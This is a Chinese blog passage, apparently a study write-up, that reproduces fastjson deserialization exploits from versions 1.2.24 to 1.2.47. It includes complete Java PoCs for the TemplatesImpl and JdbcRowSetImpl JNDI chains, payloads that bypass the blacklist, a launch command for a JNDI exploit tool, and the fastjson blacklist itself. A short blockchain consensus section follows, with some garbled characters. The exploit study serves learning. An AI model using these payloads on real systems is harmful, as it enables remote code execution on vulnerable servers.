<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Test extends AbstractTranslet &#123;</span><br><span class="line">    public Test() throws IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) &#123;&#125;    </span><br><span class="line">    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Test t = new Test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们定义Test类继承<code>AbstractTranslet</code>类，然后通过构造方法执行<code>calc</code>的命令。而下面两行的transform方法都是实现<code>AbstractTranslet</code>接口的抽象方法，具体来说的话，第一个<code>transform</code>带有<code>SerializationHandler</code>参数，是为了把<code>XML</code>文档转换为另一种格式，第二个<code>transform</code>带有<code>DTMAxisIterator</code>参数，是为了对<code>XML</code>文档中的节点进行迭代。</p>
<p>实际上就是我们<code>Test t = new Test();</code>实例化的时候，假装要把<code>xml</code>文档转换为另一种格式，在此过程中会触发构造方法，而我在构造方法中的代码就是执行<code>calc</code>，所以会弹出计算器。</p>
<p><strong>为什么要继承AbstractTranslet类</strong></p>
<p>在实战场景中，<code>Java</code>的<code>ClassLoader</code>类提供了<code>defineClass()</code>方法，可以把字节数组转换成<code>Java</code>类的示例，但是这里面的方法的作用域是被<code>Protected</code>修饰的，也就是说这个方法只能在<code>ClassLoader</code>类中访问，不能被其他包中的类访问</p>
<p>而由于我们前面编写的poc中两个<code>transform</code>方法都来自<code>AbstractTranslet</code>类，那么子类可以通过调用父类的公共方法来实现对私有属性的操作，这也能解释下面的链子是如何实现的</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326205721063.png"></p>
<p>但是，我们注意到在<code>TransletClassLoader</code>类中，<code>defineClass</code>调用了<code>ClassLoader</code>里面的<code>defineClass</code>方法</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326205743267.png"></p>
<p>然后追踪<code>TransletClassLoader</code>，发现是<code>defineTransletClasses</code></p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326205812496.png"></p>
<p>再往上，发现是<code>getTransletInstance</code></p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326205823806.png"></p>
<p>到此为止，要么是<code>Private</code>修饰要么就是<code>Protected</code>修饰，再往上继续追踪，发现是<code>newTransformer</code>，可以看到此时已经是<code>public</code>了</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326205839574.png"></p>
<p>因此，我们的利用链是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TemplatesImpl::newTransformer() -&gt; TemplatesImpl::getTransletInstance() -&gt; TemplatesImpl::defineTransletClasses() -&gt; TransletClassLoader::defineClass()</span><br></pre></td></tr></table></figure>

<p>最终poc如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.parser.Feature;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static class test&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass cc = pool.get(test.class.getName());</span><br><span class="line"></span><br><span class="line">        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;</span><br><span class="line"></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line"></span><br><span class="line">        String randomClassName = &quot;rev1ve&quot; + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line"></span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            byte[] evilCode = cc.toBytecode();</span><br><span class="line">            String evilCode_base64 = Base64.getEncoder().encodeToString(evilCode);</span><br><span class="line">            final String NASTY_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;</span><br><span class="line">            String text1 = &quot;&#123;&quot;+</span><br><span class="line">                    &quot;\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS +&quot;\&quot;,&quot;+</span><br><span class="line">                    &quot;\&quot;_bytecodes\&quot;:[\&quot;&quot;+evilCode_base64+&quot;\&quot;],&quot;+</span><br><span class="line">                    &quot;&#x27;_name&#x27;:&#x27;rev1ve&#x27;,&quot;+</span><br><span class="line">                    &quot;&#x27;_tfactory&#x27;:&#123; &#125;,&quot;+</span><br><span class="line">                    &quot;&#x27;_outputProperties&#x27;:&#123; &#125;&quot;+</span><br><span class="line">                    &quot;&#125;\n&quot;;</span><br><span class="line">            ParserConfig config = new ParserConfig();</span><br><span class="line">            Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出计算器</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326131933212.png"></p>
<h3 id="fastjson-1-2-25-反序列化漏洞"><a href="#fastjson-1-2-25-反序列化漏洞" class="headerlink" title="fastjson 1.2.25 反序列化漏洞"></a>fastjson 1.2.25 反序列化漏洞</h3><p>（学习JdbcRowSetImpl链的相关知识）</p>
<h4 id="黑白名单机制介绍"><a href="#黑白名单机制介绍" class="headerlink" title="黑白名单机制介绍"></a>黑白名单机制介绍</h4><p>众所周知，在<code>fastjson</code>自爆<code>1.2.24</code>版本的反序列化漏洞后，<code>1.2.25</code>版本就加入了黑白名单机制。<br>例如我们更换<code>1.2.25</code>版本的<code>fastjson</code>，然后再去执行原来的<code>poc</code>会发现提示<code>autoType is not support</code></p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326225435561.png"></p>
<p>查看源码可以发现这里定义了反序列化类的黑名单</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326225528275.png"></p>
<p>具体如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure>

<p>接下来我们定位到<code>checkAutoType()</code>方法，看一下它的逻辑。如果<code>autoType</code>（也就是autoTypeSupport）开启或者class对象不为空，那么先判断类名在不在白名单中，若有则<code>TypeUtils.loadClass</code>去加载，如果不在就去匹配黑名单</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326225830172.png"></p>
<p>如果没开启<code>autoType</code>那么先匹配黑名单，然后再白名单匹配和加载</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326225928936.png"></p>
<p>最后，如果要反序列化的类和黑白名单都未匹配时，只有开启了<code>autoType</code>或者<code>expectClass</code>不为空也就是指定了<code>Class</code>对象时才会调用<code>TypeUtils.loadClass</code>加载，否则<code>fastjson</code>会默认禁止加载该类。</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326230020115.png"></p>
<p>我们跟进下加载时的<code>loadClass</code>方法</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326230119890.png"></p>
<p>如果类名的字符串以<code>[</code>开头，则说明该类是一个数组类型，需要递归调用<code>loadClass</code>方法来加载数组元素类型对应的<code>Class</code>对象，然后使用<code>Array.newIntrance</code>方法来创建一个空数组对象，最后返回该数组对象的<code>Class</code>对象；如果类名的字符串以<code>L</code>开头并以<code>;</code>结尾，则说明该类是一个普通的<code>Java</code>类，需要把开头的<code>L</code>和结尾的<code>;</code>给去掉，然后递归调用<code>loadClass</code>。</p>
<h4 id="黑白名单绕过的复现（jkd版本问题未成功）"><a href="#黑白名单绕过的复现（jkd版本问题未成功）" class="headerlink" title="黑白名单绕过的复现（jkd版本问题未成功）"></a>黑白名单绕过的复现（jkd版本问题未成功）</h4><p>分析完后，复现绕过我们需要先开启默认禁用的<code>autoType</code>，这里我们添加代码即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//以下两种都行</span><br><span class="line">ParserConfig.getGlobalInstance().addAccept(&quot;org.example.,org.javaweb.&quot;);</span><br><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br></pre></td></tr></table></figure>

<p>然后启动利用工具 <a href="https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0">下载地址</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ./JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 127.0.0.1 -C &quot;calc.exe&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326230459323.png"></p>
<p>在Main.java写入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.parser.Feature;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String payload = &quot;&#123;\n&quot; +</span><br><span class="line">                &quot;    \&quot;a\&quot;:&#123;\n&quot; +</span><br><span class="line">                &quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot; +</span><br><span class="line">                &quot;        \&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;\n&quot; +</span><br><span class="line">                &quot;    &#125;,\n&quot; +</span><br><span class="line">                &quot;    \&quot;b\&quot;:&#123;\n&quot; +</span><br><span class="line">                &quot;        \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot; +</span><br><span class="line">                &quot;        \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/18zmzg\&quot;,\n&quot; +</span><br><span class="line">                &quot;        \&quot;autoCommit\&quot;:true\n&quot; +</span><br><span class="line">                &quot;    &#125;\n&quot; +</span><br><span class="line">                &quot;&#125;&quot;;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果如下</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326230642420.png"></p>
<h4 id="对两种poc绕过手法的分析"><a href="#对两种poc绕过手法的分析" class="headerlink" title="对两种poc绕过手法的分析"></a>对两种poc绕过手法的分析</h4><p>首先来说说限制，基于<code>JNDI+RMI</code>或<code>JDNI+LADP</code>进行攻击，会有一定的<code>JDK</code>版本限制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RMI利用的JDK版本 ≤ JDK 6u132、7u122、8u113</span><br><span class="line">LADP利用JDK版本 ≤ JDK 6u211 、7u201、8u191</span><br></pre></td></tr></table></figure>

<p><strong>第一种poc（1.2.25-1.2.47通杀！！！）</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;b&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1/exp&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>第二种poc</strong></p>
<p>绕过检测<code>L</code>和<code>;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSONObject;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br><span class="line">        // ldap 和 rmi都可以</span><br><span class="line">        String payload = &quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/ift2ty\&quot;, \&quot;autoCommit\&quot;:true&#125;&#125;&quot;;</span><br><span class="line">        JSONObject.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="关于JdbcRowSetImpl链利用的分析"><a href="#关于JdbcRowSetImpl链利用的分析" class="headerlink" title="关于JdbcRowSetImpl链利用的分析"></a>关于JdbcRowSetImpl链利用的分析</h4><p>从上面我们学习了绕过黑白名单的学习，接下来看<code>JdbcRowSetImpl</code>利用链的原理。 根据<code>FastJson</code>反序列化漏洞原理，<code>FastJson</code>将<code>JSON</code>字符串反序列化到指定的<code>Java</code>类时，会调用目标类的<code>getter</code>、<code>setter</code>等方法。<code>JdbcRowSetImpl</code>类的<code>setAutoCommit()</code>会调用<code>connect()</code>方法</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326233254635.png"></p>
<p><code>connect()</code>函数如下</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326233412606.png"></p>
<p>我们注意这两行代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">InitialContext var1 = new InitialContext();</span><br><span class="line">DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());</span><br></pre></td></tr></table></figure>

<p>执行过程是从命名和目录服务中查找指定名称的数据源，并将其赋值给 <code>var2</code> 变量</p>
<p>我们可以用下面demo测试下，成功弹出计算器</p>
<figure class="highlight plaintext"><figcaption><span>org.example;</span></figcaption><table><tr><td class="code"><pre><span class="line">import com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        JdbcRowSetImpl JdbcRowSetImpl_inc = new JdbcRowSetImpl();</span><br><span class="line">        JdbcRowSetImpl_inc.setDataSourceName(&quot;rmi://127.0.0.1:1099/ift2ty&quot;);</span><br><span class="line">        JdbcRowSetImpl_inc.setAutoCommit(true);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以说为什么之前的两种<code>poc</code>可以直接自定义<code>uri</code>利用成功。</p>
<h3 id="fastjson-1-2-42-反序列化漏洞"><a href="#fastjson-1-2-42-反序列化漏洞" class="headerlink" title="fastjson 1.2.42 反序列化漏洞"></a>fastjson 1.2.42 反序列化漏洞</h3><p>导入<code>fastjson 1.2.25</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">    &lt;groupId&gt;org.example&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson_1_2_42&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line"></span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt;</span><br><span class="line">        &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt;</span><br><span class="line">        &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.2.42&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>

<p>我们找到ParserConfig.class反编译一下得到java文件</p>
<p>注意到<code>checkAutoType</code>这里进行判断，仅仅是把原来的<code>L</code>和<code>;</code>换成了<code>hash</code>的形式</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326235721296.png"></p>
<p>所以直接双写<code>L</code>和<code>;</code>即可，poc如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSONObject;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br><span class="line">        // ldap 和 rmi都可以</span><br><span class="line">        String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ift2ty\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;;</span><br><span class="line">        JSONObject.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="fastjson-1-2-43-反序列化漏洞"><a href="#fastjson-1-2-43-反序列化漏洞" class="headerlink" title="fastjson 1.2.43 反序列化漏洞"></a>fastjson 1.2.43 反序列化漏洞</h3><p>修改之前的<code>pom.xml</code>里面的版本为<code>1.2.43</code>。 直接全局搜索<code>checkAutoType</code>，看修改后的代码</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240327000034710.png"></p>
<p>如果出现连续的两个<code>L</code>就报错，但是并没有对<code>[</code>限制，poc如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSONObject;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br><span class="line">        // ldap 和 rmi都可以</span><br><span class="line">        String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ift2ty\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;;</span><br><span class="line">        JSONObject.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="fastjson-1-2-44-mappings缓存导致反序列化漏洞"><a href="#fastjson-1-2-44-mappings缓存导致反序列化漏洞" class="headerlink" title="fastjson 1.2.44 mappings缓存导致反序列化漏洞"></a>fastjson 1.2.44 mappings缓存导致反序列化漏洞</h3><p>修改之前的<code>pom.xml</code>里面的版本为<code>1.2.44</code>。 这个版本的<code>fastjson</code>总算是修复了之前的关于字符串处理绕过黑名单的问题，但是存在之前完美在说<code>fastjson 1.2.25</code>版本的第一种<code>poc</code>的那个通过<code>mappings</code>缓存绕过<code>checkAutoType</code>的漏洞，poc如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSONObject;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br><span class="line">        // ldap 和 rmi都可以</span><br><span class="line">        String payload = &quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,\&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ift2ty\&quot;,\&quot;autoCommit\&quot;:true&#125;&#125;&quot;;</span><br><span class="line">        JSONObject.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="fastjson-1-2-47-mappings缓存导致反序列化漏洞"><a href="#fastjson-1-2-47-mappings缓存导致反序列化漏洞" class="headerlink" title="fastjson 1.2.47 mappings缓存导致反序列化漏洞"></a>fastjson 1.2.47 mappings缓存导致反序列化漏洞</h3><p>poc同上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSONObject;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br><span class="line">        // ldap 和 rmi都可以</span><br><span class="line">        String payload = &quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,\&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ift2ty\&quot;,\&quot;autoCommit\&quot;:true&#125;&#125;&quot;;</span><br><span class="line">        JSONObject.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链实训3</title>
    <url>/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%B1%E8%AF%86%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0.html</url>
    <content><![CDATA[<p>共识机制是一套算法、规则或协议，用于确保分布式系统中的多个节点能够就特定事务或状态达成一致意见。在分布式珠境中，书志阌的通信可能受到网络延迟、故障或恶意行为的影响，因此需要共识机制来解决教据不一教性的问题。</p>
<span id="more"></span>

<h2 id="第一部分：区块链共识机制学习"><a href="#第一部分：区块链共识机制学习" class="headerlink" title="第一部分：区块链共识机制学习"></a>第一部分：区块链共识机制学习</h2><h3 id="1-共识机制的定义和作用"><a href="#1-共识机制的定义和作用" class="headerlink" title="1. 共识机制的定义和作用"></a>1. 共识机制的定义和作用</h3><p>共识机制是一套算法、规则或协议，用于确保分布式系统中的多个节点能够就特定事务或状态达成一致意见。在分布式珠境中，书志阌的通信可能受到网络延迟、故障或恶意行为的影响，因此需要共识机制来解决教据不一教性的问题。共识机制的主要作用包括:</p>
<h4 id="1-1-数据一致性和完整性"><a href="#1-1-数据一致性和完整性" class="headerlink" title="1.1. 数据一致性和完整性"></a>1.1. 数据一致性和完整性</h4><p>共识机制确保所有节点在特定事件或操作上达成一致,从而维护数据的一致性和完整性。无论节点之间的通信是否受到干扰,系统都能保持统一的数据副本,避免数据冲突和不一致。</p>
<h4 id="1-2-分布式事务处理"><a href="#1-2-分布式事务处理" class="headerlink" title="1.2. 分布式事务处理"></a>1.2. 分布式事务处理</h4><p>在分布式数据库或账本中，共识机制确保多个节点对事务的执行达成一致，从而保证事务的合法性和正确性。这对于金融交易、供应链管理等领域至关重要。</p>
<h4 id="1-3-防止双重支付和欺诈"><a href="#1-3-防止双重支付和欺诈" class="headerlink" title="1.3. 防止双重支付和欺诈"></a>1.3. 防止双重支付和欺诈</h4><p>在加密货币领域，共识机制防止同一笔资产被多次消费，确保交易的有效性和安全性从而防止欺诈行为和双重支付。</p>
<h4 id="1-4-网络安全和抵抗攻击"><a href="#1-4-网络安全和抵抗攻击" class="headerlink" title="1.4. 网络安全和抵抗攻击"></a>1.4. 网络安全和抵抗攻击</h4><p>共识机制可以增强系统的安全性,防止恶意节点篡改数据或发动网络攻击。它通过验证节点的行为和数据，提高系统的抵抗能力。</p>
<h4 id="1-5-去中心化控制"><a href="#1-5-去中心化控制" class="headerlink" title="1.5. 去中心化控制"></a>1.5. 去中心化控制</h4><p>共识机制使分布式系统能够在无需中心控制机构的情况下运行。这意味着系统可以实现去中心化的控制和管理，减少了单点故障的风险。总之，共识机制是分布式系统中的关键组成部分，它确保了节点之间的协作和一致性，为系统的可靠性和稳定性提供了坚实的基础。不同的共识机制在不同的情境下具有优势和特点，我们将在接下来的小节中深入探讨这些机制的分类和特点。</p>
<h3 id="2-共识机制的分类和特点"><a href="#2-共识机制的分类和特点" class="headerlink" title="2. 共识机制的分类和特点"></a>2. 共识机制的分类和特点</h3><p>在分布式系统和区块链技术的领域中，共识机制是确保多个节点就特定事件或状态达成一致的核心方法。不同的共识机制基于不同的原则和机制，各自具有独特的特点和优势。</p>
<h4 id="2-1-工作量证明（Proof-of-Work，PoW）"><a href="#2-1-工作量证明（Proof-of-Work，PoW）" class="headerlink" title="2.1. 工作量证明（Proof of Work，PoW）"></a>2.1. 工作量证明（Proof of Work，PoW）</h4><p>工作量证明是最早被广泛应用的共识机制之一，其核心思想是通过解决复杂的数学难题，以证明节点对网络的贡献，从而获得权利参与共识过程。PoW机制具有以下特点：</p>
<p>安全性高：PoW的安全性源自于解决难题的复杂性，攻击者需要大量的计算能力来破解，从而防止恶意攻击的行为。</p>
<p>抵抗攻击：攻击者需要掌握绝大部分计算能力才能成功攻击，这在实际上是不切实际的，保护了网络的安全性。</p>
<p>去中心化：PoW机制鼓励广泛的节点参与，没有中心化的控制权，因此具有良好的分散性。</p>
<p>然而，PoW机制也存在能源消耗大、性能瓶颈等问题，尤其在当今环保意识高涨的情况下，其高能耗特性备受争议。</p>
<h4 id="2-2-权益证明（Proof-of-Stake-PoS）"><a href="#2-2-权益证明（Proof-of-Stake-PoS）" class="headerlink" title="2.2. 权益证明（Proof of Stake, PoS）"></a>2.2. 权益证明（Proof of Stake, PoS）</h4><p>权益证明是另一种常见的共识机制，其核心理念是参与共识的权重与持有的加密货币数量相关。PoS机制具有以下特点：</p>
<p>能源效率：相较于PoW，PoS消耗的能源要少得多，这在一定程度上解决了PoW的能源浪费问题。</p>
<p>抵抗攻击：PoS同样需要攻击者掌握大量代币，才有可能进行恶意攻击，这一特点保护了网络的安全性。</p>
<p>分散与权力：PoS可能导致持有大量代币的人在网络中拥有更多的权力，从而在一定程度上实现了权力的分散。</p>
